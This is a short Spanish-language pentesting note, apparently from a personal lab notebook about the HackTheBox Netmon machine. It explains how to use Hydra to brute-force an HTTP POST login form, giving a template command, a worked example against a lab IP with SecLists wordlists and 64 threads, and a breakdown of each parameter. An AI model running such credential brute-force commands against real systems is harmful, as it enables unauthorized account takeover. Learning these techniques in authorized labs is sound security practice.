Es una herramienta de fuerza bruta para crackear credenciales (usuario y contraseña) en servicios como HTTP, FTP, SSH, entre muchos otros.  Automatiza intentos de login usando listas de usuarios y contraseñas.  

```
hydra -L DiccionarioParaUsuarios -P DiccionarioParaContraseñas IpVictima http-post-form "RutaAlEndpointDelFormulario/:VariableDeUsuario=^USER^&VariableDeContraseña=^PASS^:F=ErrorAlEquivocarnosDeCredenciales" -t 64


Ejemplo: hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 10.10.10.152 http-post-form '/public/checklogin.htm:username=^USER^&password=^PASS^:F=Your login has failed. Please try again !' -t 64
```
*Parametros*
`-L` Lista de usuarios a probar
`-P`Lista de contraseñas a probar
`IpVictima` La ip del objetivo
`-http-post-form`Modulo de ataque(Es un formulario web que usa método POST)
	*Desglose del argumento:*
		`/public/checklogin.htm` Es el endpoint del fomulario, que lo podemos sacar de el burpsuite y es lo que esta señalado en la imagen
		`username` Variable del usuario, que en este caso es username como se ve en burpsuite
		`password`Variable de la contraseña, que en este caso es password como se ve en el burpsuite
		`F=` Es el error que nos da cuando ponemos unas credenciales erróneas
`-t` Cantidad de hilos

![[Netmon10.png]]